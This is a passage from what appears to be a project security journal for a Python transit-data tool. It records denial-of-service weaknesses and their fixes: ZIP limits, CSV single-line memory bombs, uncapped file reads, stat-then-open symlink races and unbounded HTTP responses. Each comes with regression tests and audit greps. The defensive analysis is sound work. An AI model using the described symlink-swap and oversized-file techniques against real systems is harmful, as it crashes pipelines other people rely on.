in CPython 3.11+). A lying central directory CANNOT amplify memory beyond the declared value under current Python — an attacker who ships a ZIP with declared `file_size = 1` but actual decompressed payload ≫ 1 byte hits `BadZipFile: Bad CRC-32` on the very first `read()`. The metadata-based caps therefore add defence-in-depth on the *orthogonal* shape axes (per-entry, count, filename) rather than the size-amplification axis the CRC check already enforces. The PoC `test_lying_central_directory_metadata_is_attacker_controlled` pins this fact AS A REGRESSION TEST so any future Python version that weakens CRC enforcement fails the suite immediately (the test asserts `data == b""` for a lying-CD ZIP whose declared `file_size = 0`; if Python ever returns more bytes than declared, the assertion fires).

**Prevention:** Three reinforcing rules:
  (a) **Multi-axis closing-grep audit rule** (CSV-round reinforcement made permanent): every defensive round MUST enumerate the orthogonal shape axes BEFORE landing the fix, not just the canonical "total bytes" axis. The four-axis taxonomy for any container-format parser is: (i) total uncompressed size; (ii) per-element / per-entry uncompressed size; (iii) element / entry count; (iv) per-element name length. The audit grep at PR-review time MUST cover all four axes. Mirrors the four-quadrant audit rule from Round 7 (shape × scope) — same closing-checklist completeness applied to axis × axis instead.
  (b) **Third-party parser inventory rule** (CSV-round next-round target made permanent): every third-party parser that takes a file-like and consumes via `iter` (`zipfile.ZipFile`, `openpyxl.load_workbook`, `tarfile.TarFile`, `gzip.GzipFile`, `xml.etree.iterparse`, future libraries) MUST route through a canonical helper that closes the four shape axes. The auto-discoverable invariant lives in `tests/test_sentinel_zip_archive_validation.py:test_no_unbounded_zipfile_zipfile_in_src_or_scripts` — the walker scans `src/` + `scripts/` for `zipfile.ZipFile(` and asserts every match's module also calls `validate_zip_archive_safe`. Same shape can be replicated for tarfile / gzip / iterparse / etc. when those parsers are added to the codebase.
  (c) **CRC-enforcement-as-floor rule**: when the canonical helper relies on the underlying parser's existing enforcement (e.g. Python's `zipfile` per-entry CRC validation as the size-amplification floor), a regression test MUST pin that enforcement so a future parser version that weakens it fails the suite. The PoC `test_lying_central_directory_metadata_is_attacker_controlled` is the canonical example — it patches a real ZIP's CDH/LFH to lie about `file_size` and asserts the actual returned bytes equal the declared `file_size = 0`. If a future Python version skips CRC validation under any code path, the assertion fires and the helper's threat model is re-derived.

The fix shape: `extract_stations` calls `validate_zip_archive_safe(archive, label="ÖBB workbook")` after opening the `zipfile.ZipFile`. The helper signature is `(archive, *, max_total_uncompressed=100*1024*1024, max_per_entry_uncompressed=50*1024*1024, max_entries=1000, max_filename_length=1024, label="ZIP")` — defaults sized at >>100x the largest legitimate xlsx shape (real ÖBB workbook ~10-15 entries with sheet1.xml ~5-10 MiB) so production state is never rejected. The helper raises `ValueError` (caught by the surrounding `except zipfile.BadZipFile` is widened to `except (zipfile.BadZipFile, ValueError)` in extract_stations because `validate_zip_archive_safe` raises `ValueError`, not `BadZipFile` — but extract_stations already wraps the whole block in `try/except zipfile.BadZipFile` → re-raise as `ValueError("Invalid workbook file")`, and the new `ValueError` from the validator propagates to the same caller that handles `ValueError` from the original `total_size > MAX` raise). The new helper plus its inventory test become the canonical pin for any future ZIP-archive-consuming parser added to the codebase.

## 2026-05-08 - CSV Size-Bomb: `csv.DictReader(handle)` Across Ten Sites Inherits the Same Unbounded `readline()` Allocation the JSON-Family Rounds Closed for `read_text` / `json.load`
**Vulnerability:** JSON Size-Bomb Rounds 1–7 closed the unbounded `json.load` and `Path.read_text()` axes across `src/` and `scripts/`. Re-running the auto-discoverable closing grep `git grep -nE 'csv\.(DictReader|reader)' src/ scripts/ | grep -v 'StringIO\|test_'` returned **ten open sites in five modules** that consume operator-controlled CSV files via `path.open("r", ...)` -> `csv.DictReader(handle)` with NO byte-size cap whatsoever:
  (1) `src/utils/stations_validation.py:_load_gtfs_stop_ids` (line 317 pre-fix, **HIGH** — CI gate via `validate_stations.py`);
  (2) `scripts/update_station_directory.py:_load_gtfs_locations` (line 369 pre-fix, **HIGH** — cron pipeline);
  (3) `scripts/update_station_directory.py:_load_wienerlinien_locations` (line 400 pre-fix, **HIGH** — same blast radius);
  (4) `scripts/update_station_directory.py:_load_vor_locations` (line 435 pre-fix, **HIGH** — same blast radius);
  (5) `scripts/update_station_directory.py:_iter_vor_rows` (line 824 pre-fix, **HIGH** — feeds `load_vor_stops`);
  (6) `scripts/update_vor_stations.py:_dict_reader` (line 318 pre-fix, **HIGH** — cron pipeline);
  (7) `scripts/update_wl_stations.py:_dict_reader` (line 230 pre-fix, **HIGH** — cron pipeline);
  (8) `scripts/enrich_station_aliases.py:_load_vor_names` (line 300 pre-fix, **HIGH** — cron pipeline);
  (9) `scripts/enrich_station_aliases.py:_load_gtfs_index` (line 367 pre-fix, **HIGH** — cron pipeline);
  (10) `scripts/gtfs.py:read_gtfs_stops` (line 81 pre-fix, **MEDIUM** — exported via `__all__`).
The pathological shape: a planted CSV with **no newlines after the header** consumes every byte until EOF in one `handle.readline()` call, exhausting memory before any field is yielded. `csv.DictReader` iterates the underlying text file via `iter(handle)` -> `handle.readline()` which buffers the input *up to the next newline or EOF* — a planted N-MiB single-line CSV allocates O(N) bytes BEFORE `csv.reader` ever inspects a field, propagating `MemoryError` (a `BaseException` subclass that is NOT caught by `except (OSError, csv.Error, ValueError)`) past every loader and crashing the cron pipeline (the orchestrator runs every script via `subprocess.run(check=True)`). The exploit is REPRODUCED in `tests/test_sentinel_csv_size_bomb.py` with **19 tests** (6 precondition + 1 auto-discoverable inventory + 10 site-specific PoCs + 1 within-cap regression + 1 sanity). Pre-fix every site fed an attacker-controlled file into `csv.DictReader(handle)` and read it via the unbounded `readline()`; post-fix every site routes through `read_capped_text(path, MAX_*_BYTES, ...)` -> `io.StringIO(content)` -> `csv.DictReader(...)`, bounded by the canonical 50 MiB ceiling and the TOCTOU-safe `os.fstat`-on-open-fd shape inherited from `read_capped_text`.

**Learning:** The size-bomb family extends to *any* stdlib helper that reads operator-controlled bytes via `iter(handle)` / `readline()` / `read()`-without-size-arg — not just `json.load(handle)` and `Path.read_text()`. Specifically `csv.DictReader(handle)` performs `next(iter(handle))` per row, where `next()` on a TextIOWrapper calls `handle.readline()` which is unbounded. The **same pattern almost certainly applies** to `configparser.ConfigParser.read(path)`, `tomllib.load(handle)`, `pathlib.Path.read_bytes()` (Python's special-file-safe sibling of `read_text`), and any third-party parser that takes a file handle and reads through `iter`. The structural verdict for the next size-bomb round is: **walk every stdlib helper that takes a file-like and consumes via `iter` / `readline` / `read` without an explicit size argument**, not just the four shapes (`json.load`, `Path.read_text`, network response, TOCTOU stat-then-open) the prior rounds enumerated. Drift defence: the `test_no_unbounded_csv_dictreader_in_src_or_scripts` walker in this round's PoC test pins the auto-discoverable closing grep `git grep -nE 'csv\.(DictReader|reader)' src/ scripts/ | grep -v 'StringIO\|test_'` as a **mechanical inventory test** so any future CSV-reader addition without the cap fails the suite immediately. Each prior round committed to "structural rule generalises beyond size-bombs" but the next round STILL discovered a new shape; the right meta-rule is therefore: **every defensive round MUST add an inventory test** (not just a per-site PoC) so the closing grep is not just narrative — it executes on every CI run and catches the drift the human reviewer would miss. The CSV reader fan-out shipped with **ten unprotected callsites** because no inventory test ran the closing grep that any prior journal entry would have demanded.

## 2026-05-08 - JSON Size-Bomb Drift Round 7: Round 6's `src/`-Only Closing-Grep Excluded Nine Sibling `read_text` Sites Across Three `src/utils/` Modules and Four `scripts/`
**Vulnerability:** Round 6 of the size-bomb family canonicalised `read_capped_text` for the non-JSON `Path.read_text()` -> `MemoryError` propagation shape across **six sites in two modules** (`src/providers/vor.py` ×5, `src/feed/logging.py` ×1) and pinned the auto-discoverable closing grep `git grep -nE 'read_text\(' src/ | grep -v 'read_capped_text\|test_'`. **But the grep was `src/`-only** — exactly the same `scripts/`-tree blind spot that JSON Size-Bomb Round 3 closed for the `json.load` axis after Round 2's `src/`-only verdict. Re-running the grep against BOTH `src/` and `scripts/` returned **nine open sites in six modules**:
  (1) `src/utils/env.py:read_secret` systemd-credentials branch (line 128 pre-fix, **CRITICAL** — called at startup of every script that imports a provider via `read_secret("VOR_ACCESS_ID"/"GOOGLE_ACCESS_ID"/"FEED_GITHUB_TOKEN")`; `$CREDENTIALS_DIRECTORY` is operator-controlled);
  (2) `src/utils/env.py:read_secret` docker-secrets branch (line 141 pre-fix, **CRITICAL** — same blast radius, reads `/run/secrets/<name>` unbounded);
  (3) `src/utils/env.py:load_env_file` (line 374 pre-fix, **CRITICAL** — called at startup via `load_default_env_files` from five scripts including `scripts/check_vor_auth.py` / `scripts/update_station_directory.py`; the `WIEN_OEPNV_ENV_FILES` env var allows extra paths beyond the default `.env`/`data/secrets.env`/`config/secrets.env`);
  (4) `src/utils/secret_scanner.py:load_ignore_file` (line 276 pre-fix, **HIGH** — CI gate; planted huge `.secret-scan-ignore` crashes the secret scanner before secrets are detected on the rest of the repo);
  (5) `src/utils/secret_scanner.py:scan_repository` per-file content read (line 507 pre-fix, **HIGH** — CI gate; planted huge tracked file crashes the scanner before sibling-file secrets are flagged);
  (6) `scripts/check_complexity.py:_parse_baseline` (line 58 pre-fix, **MEDIUM** — CI gate; planted huge `.c901-baseline.txt` crashes the C901 complexity gate);
  (7) `scripts/fetch_google_places_stations.py:_write_if_changed` (line 299 pre-fix, **MEDIUM** — reads existing `stations.json` unbounded before the write decision);
  (8) `scripts/update_vor_cache.py:_seed_station_ids_from_file` (line 40 pre-fix, **MEDIUM** — reads `data/vor_station_ids_wien.txt` unbounded at startup of the daily VOR cache update);
  (9) `scripts/update_vor_stations.py:_read_station_ids_from_file` (line 397 pre-fix, **MEDIUM** — reads operator-supplied station ID file unbounded).
Threat model is identical to all prior rounds: compromised CI runner / partial flush + power loss / corrupted previous run / parallel orchestrator process performing an atomic state swap mid-read. Sites #1–#3 are **WORSE than Round 6's vor.py sites**: they run at the *very startup* of every script in the cron pipeline (before any provider import resolves), so a planted huge file at `$CREDENTIALS_DIRECTORY/<name>` or `.env` propagates `MemoryError` past `except (OSError, ValueError, UnicodeDecodeError)` (the `BaseException`-rooted class is NOT in the catch tuple) and crashes the script BEFORE it can log a single diagnostic line. Sites #4–#5 turn the CI gate against itself — a malicious PR that plants a huge file in the repo blocks the secret scanner from detecting any other planted secrets in the same PR. The exploit is REPRODUCED in `tests/test_sentinel_json_size_bomb_round7.py` with one PoC test per site (18 tests total: 2 precondition + 9 site-specific PoCs + 6 normal-case regressions + 1 inventory). Pre-fix every site loaded a multi-MiB attacker-controlled file and propagated `MemoryError` past the catch tuple; post-fix the canonical helper `read_capped_text` rejects oversized files via the TOCTOU-safe `os.fstat(handle.fileno())` + `handle.read(max_bytes + 1)` shape.

**Learning:** Round 6 named the auto-discoverable closing grep but **applied it to `src/` only** — the same `scripts/`-tree blind spot that JSON Size-Bomb Round 3 had already closed for the `json.load` axis after Round 2's `src/`-only verdict. The recursive meta-pattern is now five rounds deep: (a) Round 1 named 5 sites, Round 2 found 6 more in `src/`, Round 3 found 16 more in `scripts/`, Round 4 found 3 more on the network axis, Round 5 found 11 more via TOCTOU bypass, Round 6 found 6 more via the `read_text` shape, Round 7 found 9 more in `scripts/` + `src/utils/` for the same `read_text` shape. Each round closes one structural axis (shape, scope, axis) and surfaces the next. The right structural verdict for the size-bomb family is now: **every defence round MUST apply both shape walkers (stat-then-open AND read-text-direct) across BOTH scope trees (`src/` AND `scripts/`) on BOTH axes (disk AND network)**. Walking only one quadrant (the canonical mistake of every prior round) leaves the other three open. The structural rule generalises beyond size-bombs: any defensive round whose verdict-line is "we walked X but deferred Y" SHOULD trigger an explicit "Round N+1 will walk Y" entry in the journal AND a tracking issue, otherwise the deferred set becomes the next year's CVE feed. Three sites in this round (#1, #2, #3) are CRITICAL because they run at the absolute startup of every script — earlier than any provider import — so the failure mode is a totally silent crash with no log line. The lesson: every "startup-time read of an operator-controlled file" is a CRITICAL severity by default, regardless of file size or shape, because the normal diagnostic plumbing has not been initialised yet.

The auto-discoverable closing grep that catches THIS round's family is now `git grep -nE 'read_text\(' src/ scripts/ | grep -v 'read_capped_text\|test_\|^[^:]*:#'` — every match is a candidate that MUST either route through `read_capped_text` or be marked as a justified exception with the structural reason (e.g. internal CI tools that read their own output, where the input is fully trusted). The `read_capped_text` helper signature was extended in this round with an `errors: str = "strict"` parameter to preserve the legacy `errors="ignore"` lossy-decode contract for the secret scanner's per-file content read (which previously consumed bytes that aren't valid UTF-8 but slip past the `_is_binary` null-byte check); the strict default is correct for every other call site (canonical files are always valid UTF-8). Combined with all prior rounds the canonical inventory now stands at **44 covered parsers (38 disk + 3 network + 3 disk-text)** — every one TOCTOU-safe, special-file-safe, and threat-indexed-helper-routed.

**Prevention:** Three reinforcing rules:
  (a) **Four-quadrant audit rule for memory-exhaustion via sync read** (Round 6 reinforcement made permanent): every size-bomb defence round MUST walk all four quadrants — (shape: stat-then-open, shape: read-text-direct) × (scope: `src/`, scope: `scripts/`). The closing grep at PR-review time is the four-quadrant union: `git grep -nE 'read_text\(|read_bytes\(|\.stat\(\)\.st_size' src/ scripts/`. Any match outside the inventory test must either be in `read_capped_*` flow or carry a justified exception comment. Walking fewer quadrants is the multi-round drift Rounds 1–7 documented; the four-quadrant verdict is the structural completion criterion. Mirrors the two-axis (disk + network) audit rule from Round 4 — same closing-checklist completeness applied to shape × scope instead of axis.
  (b) **Startup-time blast-radius rule**: every loader that runs at script startup (BEFORE any provider import resolves, e.g. `read_secret`, `load_env_file`, `_seed_*_from_file`) is a CRITICAL severity by default — the failure mode is silent crash with no diagnostic line because logging plumbing isn't initialised yet. The structural rule: every startup-time loader MUST route through the canonical safe helper before any other side-effect (env-var population, ID parsing, etc.) so a planted-huge file degrades to "no values seeded" instead of "process crashes silently". Mirrors the import-time blast-radius rule from Round 5 (`@lru_cache`-decorated loaders); same threat model applied to the operator-controlled-path loader family.
  (c) **`errors="ignore"` lossy-decode contract preservation rule**: when migrating a legacy `Path.read_text(encoding="utf-8", errors="ignore")` call to `read_capped_text`, the `errors=` kwarg MUST be threaded through to preserve the lossy-decode contract. Strict UTF-8 decoding silently drops non-UTF-8 fragments at the file boundary (returns `None`) instead of returning the partial text — a behavioural regression for the secret scanner's per-file walk where non-UTF-8 fragments may live alongside valid secrets in the same file. The structural pin: `tests/test_sentinel_json_size_bomb_round7.py:test_secret_scanner_scan_skips_oversized_file` exercises both branches (oversized file MUST be skipped; sibling file with secret MUST still be flagged).

The fix shape mirrors Round 6: replace `path.read_text(encoding="utf-8")` with `read_capped_text(path, MAX_*_BYTES, label=..., logger=log)`. Per-loader caps are sized at >>1000x the largest legitimate file shape (1 MiB for `.env` / systemd creds / docker secrets / `.secret-scan-ignore` / `.c901-baseline.txt`; 50 MiB for the secret scanner's per-tracked-file scan; 5 MiB for the VOR station ID seed files; 50 MiB for `stations.json`) so the cap does NOT introduce a false-positive rejection of valid state. The PoC tests use `tmp_path` real-filesystem fixtures (the prior `unittest.mock.MagicMock`-based tests on `Path` no longer reach the new `open + fstat + read` flow); the two failing legacy tests `test_read_secret_systemd_priority` / `test_read_secret_docker_priority` were rewritten to use real files plus a `monkeypatch.setattr("src.utils.env.DOCKER_SECRETS_DIR", ...)` for the docker base path. The `errors="strict"`-by-default behaviour change preserves backwards compatibility because every other call site reads canonical files that are always valid UTF-8.

## 2026-05-08 - JSON Size-Bomb Drift Round 6: Round 5's 8-Module Canon Excluded `src/providers/vor.py` and `src/feed/logging.py` Where Five Sibling Sites Use a *Different* Unsafe Shape (`Path.read_text()` Without Any Cap)
**Vulnerability:** Round 5's TOCTOU closure pinned the canonical fix shape (`Path.open("rb")` → `os.fstat(handle.fileno())` → `handle.read(max_bytes + 1)`) across **eleven sites in eight modules** and added an AST inventory walker (`test_no_function_uses_unsafe_stat_then_open_pattern`) that scans those eight modules for the unsafe `path.stat().st_size` → `path.open()` shape. **But the walker scanned for ONE specific anti-pattern — stat-then-open — and missed five sibling sites in two additional modules that use a STRUCTURALLY DIFFERENT unsafe shape: `Path.read_text(encoding="utf-8")` followed by `json.loads(...)` or `str.splitlines()` with NO size cap whatsoever**. These sites are WORSE than the prior canonical sites pre-Round-5: those at least gated on `stat().st_size` (TOCTOU-bypassable but bounded). The five sites in this round had nothing — `Path.read_text()` is a single syscall that buffers the entire file before any size check could even run. Sites: (1) **`src/providers/vor.py:_load_station_name_map`** (CRITICAL: import-time call site `STATION_NAME_MAP = _load_station_name_map()` runs unconditionally on `import src.providers.vor`, so a planted-huge `data/vor-haltestellen.mapping.json` raises `MemoryError` at module-import time, killing the WHOLE VOR provider import + every consumer including `build_feed`, `cli`, every script that imports the provider); (2) **`src/providers/vor.py:load_request_count`** (HIGH: invoked per-request from the VOR fetch pipeline; an unbounded read crashes the entire daily quota debit chain); (3) **`src/providers/vor.py:save_request_count`** inner read-back-under-lock (HIGH: invoked per-request mid-quota-debit; double-counts requests on the next cron run after a crash); (4) **`src/providers/vor.py:_load_station_ids_from_file`** (MEDIUM: env-overridable CSV path read unbounded); (5) **`src/providers/vor.py:_load_station_ids_default`** (MEDIUM: default catalogue CSV read unbounded); (6) **`src/feed/logging.py:prune_log_file`** (MEDIUM: log-pruning utility reads the active log file unbounded; a planted huge file at the log path raises `MemoryError` past the surrounding `except OSError` and crashes the pruning cron). Threat model is identical to all prior rounds: compromised CI runner / partial flush + power loss / corrupted previous run / parallel orchestrator process performing an atomic state swap mid-read. The exploit is REPRODUCED in `tests/test_sentinel_json_size_bomb_round6.py` with one PoC test per site (16 tests total, 6 site-specific + 6 helper-coverage + 2 precondition + 2 regression). Pre-fix every site loaded a multi-MiB attacker-controlled file and propagated `MemoryError` past the catch tuple; post-fix the canonical helpers (`read_capped_json` for the 3 JSON sites, new `read_capped_text` for the 3 text/CSV sites) reject oversized files via the TOCTOU-safe `os.fstat(handle.fileno())` + `handle.read(max_bytes + 1)` shape Round 5 pinned. Severity HIGH because the import-time blast radius covers every feed-build path that imports the VOR provider (which is ALL of them).

**Learning:** Rounds 1–5 of the size-bomb defence canonicalised one specific anti-pattern (the `stat-then-open` two-syscall shape used by 27 disk parsers) and the AST walker that catches it. **But the family of "unsafe sync read of an attacker-controlled file" includes a SECOND anti-pattern that the walker doesn't catch**: the single-syscall `Path.read_text()` shape, which is structurally DIFFERENT from stat-then-open (no stat call to detect, no separate open call to flag) but produces the SAME `MemoryError`-via-`BaseException` propagation. The two patterns share the same threat model and the same fix shape (open binary + fstat on the open fd + bounded read), but the search query that catches one DOES NOT catch the other. The auto-discoverable closing grep is `git grep -nE 'read_text\(' src/ | grep -v 'read_capped_text\|test_'` — every match is a candidate. The right structural verdict from this round: **the canonical defence inventory must be indexed by THREAT (memory-exhaustion via unbounded sync read) rather than by SHAPE (stat-then-open vs. read-text-direct)**. This generalises to any future "X-then-Y race" rule: indexing by shape always misses the sibling shapes that share the threat model. Round 5's walker was correct for the shape it was built to catch; Round 6's lesson is that the walker MUST be supplemented with a threat-indexed walker that catches the broader family of "any sync read of a file path that doesn't bound the byte count BEFORE buffering". The auto-discoverable invariant lives in the new `tests/test_sentinel_json_size_bomb_round6.py` — six site-specific PoC tests that monkeypatch the file path to point at an oversized file, mock `json.loads` (where applicable) to assert the parser is never reached, and assert the loader returns the canonical sentinel value (`{}`, `(None, 0)`, `[]`, silent return).

**Prevention:** Three reinforcing rules:
  (a) **Threat-indexed inventory rule for memory-exhaustion via sync read**: every on-disk parser that ingests an attacker-controlled file (anywhere under `data/`, `cache/`, `log/`, env-overridable paths) MUST route through a canonical helper (`read_capped_json`, `read_capped_text`, or a per-loader variant). Direct `Path.read_text()` / `Path.read_bytes()` followed by `json.loads(...)` / `str.splitlines()` / `parse_xxx(...)` is the broader anti-pattern family; the canonical helper signature pin is the structural enforcement. Mirrors the `request_safe` / `fetch_content_safe` contract on the network axis (Round 4) — same threat-indexed routing applied to the disk axis.
  (b) **Two-walker rule for sync-read auditing**: the canonical AST inventory walker must catch BOTH (i) the `path.stat().st_size` → `path.open()` shape (Round 5's `test_no_function_uses_unsafe_stat_then_open_pattern`) AND (ii) the `path.read_text()` → `json.loads()` / `path.read_text()` → `splitlines()` shape (the Round 6 anti-pattern). The two walkers together cover the full memory-exhaustion-via-sync-read taxonomy at the AST level. Without (ii), any future PR that adds a new `Path.read_text()`-based loader silently slips past CI even though the file's still vulnerable to the size-bomb attack.
  (c) **Canonical helper export rule for non-JSON text payloads**: `read_capped_text` is the canonical helper for non-JSON sync reads (CSV, .env, log files). It MUST share the same signature and TOCTOU-safe shape as `read_capped_json` so the two helpers are interchangeable at the call site (the only difference is the parser invoked on the bounded bytes). The shared signature is `(path, max_bytes, *, label, logger)` — pin the signature at the test layer (`test_precondition_read_capped_text_helper_exists`) so a future refactor can't drift the helper away from the canonical shape.

The fix shape mirrors Rounds 1–5: replace `json.loads(PATH.read_text(...))` with `read_capped_json(PATH, MAX_VOR_*_FILE_BYTES, label="VOR ...", logger=log)`; replace `PATH.read_text(...)` (text only) with `read_capped_text(PATH, MAX_VOR_*_FILE_BYTES, label="...", logger=log)`. Per-loader caps are sized at ~100x the largest legitimate file (5 MiB for `vor-haltestellen.mapping.json` ~35 KiB and `vor-haltestellen.csv` ~8 KiB; 1 MiB for `vor_request_count.json` ~50 bytes; `2 * MAX_LOG_BYTES = 200 MiB` for the active log file given `MAX_LOG_BYTES=100 MiB`'s pre-existing rotation ceiling) so the cap does NOT introduce a false-positive rejection of valid state. Combined with all prior rounds the canonical inventory now stands at **35 covered parsers (32 disk + 3 network)** — every one TOCTOU-safe AND special-file-safe AND threat-indexed-helper-routed.

## 2026-05-08 - JSON Size-Bomb Drift Round 5: TOCTOU Bypass of `path.stat()` → `path.open()` Across All 11 Canonical Loader Sites
**Vulnerability:** Rounds 1–4 of the JSON size-bomb family canonicalised the "stat-then-cap-then-read" pattern across **27 on-disk parsers** in 13 modules (Rounds 1–3 closed disk; Round 4 closed the network-response axis). Every closure used the same two-syscall shape: `if path.stat().st_size > MAX_*_FILE_BYTES: return/raise; with path.open(...) as h: json.load(h)`. The byte-size cap fires BEFORE `open()` so the file content is never buffered when oversized — that was the canonical defence. **But the cap is implemented across two separate syscalls** (`Path.stat` resolves the path AND follows symlinks, then `Path.open` resolves the path AND follows the symlink AGAIN), and an attacker who can swap the inode at *path* between those two calls bypasses the cap entirely: T0 `path` is a symlink → small.json (under cap); T1 `path.stat().st_size` returns the small target's size → cap passes; T2 attacker atomically swaps the symlink to point to big.json via `os.replace(tmp_link, path)` (or a parallel writer's own `atomic_write` rename swaps the inode under the loader's feet); T3 `path.open()` re-resolves the symlink → opens big.json (over cap); T4 `json.load(handle)` buffers the whole 1 GiB file → `MemoryError` propagates past the surrounding `except (OSError, json.JSONDecodeError, RecursionError)` (a `BaseException`-rooted class is NOT in the catch tuple) and crashes the cron pipeline. The vulnerability spans **eleven sites in eight modules**: (1) `src/utils/files.py:read_capped_json` (canonical helper used by 16+ scripts via the shared-helper pattern); (2) `src/utils/stations.py:_read_capped_json` (private helper for the two `@lru_cache` import-time loaders `_station_entries` and `_vienna_polygons` — CRITICAL because their import-time blast radius covers every feed-build path that touches a station name or Vienna geo-fence check); (3–5) `src/utils/cache.py:read_cache`, `read_status`, `write_cache` data-degradation guard; (6) `src/places/quota.py:MonthlyQuota.load`; (7) `src/places/tiling.py:load_tiles_from_file`; (8) `src/places/merge.py:load_stations`; (9) `src/utils/stations_validation.py:_load_stations`; (10–11) `src/build_feed.py:_load_state` and `_save_state` data-merge read. Every site shares the canonical TOCTOU shape and the same `MemoryError`-is-`BaseException` propagation. The exploit is REPRODUCED in `tests/test_sentinel_json_size_bomb_toctou.py:test_read_capped_json_resists_toctou_lying_stat`: pre-fix the loader returns a 1 MiB list of zeros despite `max_bytes=1024`; post-fix it returns `None`. Severity MEDIUM-HIGH because the threat model is identical to the prior rounds (compromised CI runner / partial flush + power loss / corrupted previous run / parallel orchestrator process performing an atomic state swap mid-read) and the blast radius covers every feed-build path that imports `vor.py`/`stations.py`/`build_feed.py`.

**Learning:** Round 1's "stat-then-cap-then-read" verdict pinned the order ("the size-cap MUST fire BEFORE `open()` so the file content is never buffered into memory when oversized") but did NOT pin the sameness of the inode between stat and open. The two-syscall shape is non-atomic on POSIX: `Path.stat` and `Path.open` each independently resolve the path (and follow symlinks), so an attacker who controls the directory entry can race between them. The right closure uses ONE syscall to acquire a file descriptor and then `os.fstat(handle.fileno())` to query the size of the *opened* inode — `fstat` reports the size of the inode the open() call resolved, immune to subsequent symlink swaps. Same TOCTOU family as the classic `access`-then-`open` shell-script CVEs: any size/permission/type check that's done on a path BEFORE acquiring the file descriptor is a TOCTOU candidate. The fix shape canonicalised across all 11 sites:
```python
with path.open("rb") as handle:
    if os.fstat(handle.fileno()).st_size > MAX_*:
        return / raise / treat_missing
    raw = handle.read(MAX_* + 1)  # defense-in-depth against zero-st_size special files
    if len(raw) > MAX_*:
        return / raise / treat_missing
    payload = json.loads(raw)
```
The defense-in-depth `read(MAX_* + 1)` cap is the second axis closed in this round: special files (FIFOs, `/dev/zero`, `/dev/random`, character devices) report `st_size == 0` regardless of how much they yield on read, so an attacker who can swap the loader target to `/dev/zero` (via symlink TOCTOU) would otherwise have `fstat` return 0 (≤ cap, passes) and `read()` allocate unbounded bytes. Bounding the read at `MAX_* + 1` truncates the read budget to one byte over the cap, then rejects if more bytes arrived — exactly the contract `read_response_safe` already provides for the network axis. Combined with all prior rounds, the canonical inventory now stands at **30 covered parsers (27 disk + 3 network)** — every one TOCTOU-safe AND special-file-safe. The auto-discoverable invariant lives in `tests/test_sentinel_json_size_bomb_toctou.py:test_no_function_uses_unsafe_stat_then_open_pattern`: an AST walker that scans the eight canonical loader modules, flags every function that gates `open()` on `path.stat().st_size` without a paired `os.fstat` call, and fails the suite at PR-review time. Any future PR that adds a new on-disk JSON loader using the unsafe pattern fails the walker before merge.

**Prevention:** Two reinforcing rules:
  (a) **Two-syscall TOCTOU rule for size/permission/type checks**: any defensive check that depends on a file's metadata MUST be performed on the *open file descriptor* (via `os.fstat(handle.fileno())`, `os.fchmod`, `os.fstatvfs`, etc.), NOT on the path before acquiring the descriptor. The `Path.stat` → `Path.open` pattern is a classic TOCTOU shape — the path resolves twice, and an attacker who controls the directory entry can race between the two resolutions. The canonical closing grep is `git grep -nE '\.stat\(\)\.st_size'` paired with `path.open|read_text|read_bytes|json\.load` in the same function — every match is a TOCTOU candidate. Mirrors the stat-vs-fstat distinction documented in the POSIX security literature for decades; the rule was never named in the prior rounds because the threat model focused on "planted-huge file" rather than "swapped-inode mid-read". Round 5 closes that orientation gap.
  (b) **Special-file `st_size == 0` audit rule**: every byte-size cap implemented via `os.fstat(...).st_size` MUST be paired with a defense-in-depth read cap (`handle.read(max_bytes + 1)` followed by a `len(raw) > max_bytes` check). Special files (FIFOs, `/dev/zero`, character devices) report `st_size == 0` regardless of how much they yield on read, so the fstat-only check is bypassable by a symlink swap to a special file. Mirrors `read_response_safe`'s streaming-byte-budget tally on the network axis (Round 4) — same defence-in-depth shape applied to the disk axis. The auto-discoverable test pattern lives in `test_read_capped_json_resists_zero_size_special_file`: monkeypatches `os.fstat` to report `st_size=0` and asserts the loader still rejects the over-cap content.

The fix shape mirrors `513dcb4` / `55009db` / Rounds 1–4: replace `path.stat().st_size > MAX` with `os.fstat(handle.fileno()).st_size > MAX` after an immediate `path.open("rb")`, then bound the read at `max_bytes + 1`, then `json.loads` on the bounded bytes. The `path.open("rb")` (binary mode) is intentional: `json.loads` accepts bytes natively (UTF-8/16/32 detection runs on the buffer), and binary mode avoids the encoding= keyword bikeshed across heterogeneous callers. PoC tests for every site monkeypatch `Path.stat` (or `os.fstat`) to lie and assert the post-fix code uses the open-fd metadata; the auto-discoverable inventory walker covers all eight canonical loader modules so a future PR cannot regress the pattern.

## 2026-05-08 - JSON Size-Bomb Drift Round 4: Network-Response Sibling — `scripts/` `session.get/post` Bypassed `request_safe`/`fetch_content_safe`
**Vulnerability:** The 2026-05-08 Rounds 1–3 of JSON size-bomb defences canonicalised the "stat-then-cap-then-read" pattern for **27 on-disk JSON parsers across 13 modules** (5 in `src/utils/cache.py`/`quota.py`/`tiling.py` in Round 1, 6 in `src/utils/stations.py`/`merge.py`/`stations_validation.py`/`build_feed.py` in Round 2, 16 across 8 `scripts/` modules in Round 3 via the shared `read_capped_json` helper). Every round's prevention rule documented the size-bomb threat as "wide-but-flat memory exhaustion bypasses the depth-bomb catch tuple because `MemoryError` is a `BaseException` subclass that escapes any `except (OSError, json.JSONDecodeError, RecursionError)` handler". Re-running the inverse enumeration grep against the structurally-orthogonal **network-response** axis (`grep -rn 'session\.\(get\|post\)' src/ scripts/` filtered against sites that bypass the project's canonical safe HTTP layer `request_safe`/`fetch_content_safe`) returned **three open sites in two scripts**, each followed by `response.json()` / `response.text` with NO byte-size cap on the response body: (1) `scripts/fetch_vor_haltestellen.py:fetch_access_id:161` — `resp = session.get(config_url, timeout=30)` then `resp.text` to extract the VAO `accessId` from `https://anachb.vor.at/webapp/js/hafas_webapp_config.js`; (2) `scripts/fetch_vor_haltestellen.py:fetch_candidates:411` — `resp = session.post(mgate_url, json=payload, timeout=30)` to the VAO mgate endpoint then `resp.json()`; (3) `scripts/update_vor_stations.py:fetch_vor_stops_from_api:589` — `response = session.get(VOR_BASE_URL + "location.name", ...)` then `response.json()`. All three sites buffer the full response body via `requests.Response._content` before parsing — a compromised upstream / DNS-hijack / MITM / content-cache-poisoning attack on the VAO endpoints serving a 1 GiB `[1,1,1,…]` payload would (a) allocate a 1 GiB Python `bytes` object via the eager body buffer, (b) call `json.loads` which allocates ~5x more in `int`/`list`/`dict` overhead, (c) trip `MemoryError` which propagates past the existing `except (ValueError, RecursionError)` handlers (because `MemoryError` is `BaseException`, not `Exception`-rooted) and crashes the script. Severity MEDIUM-HIGH because the orchestrator (`scripts/update_all_stations.py`) runs every update script via `subprocess.run(check=True)` — an unhandled `MemoryError` raises 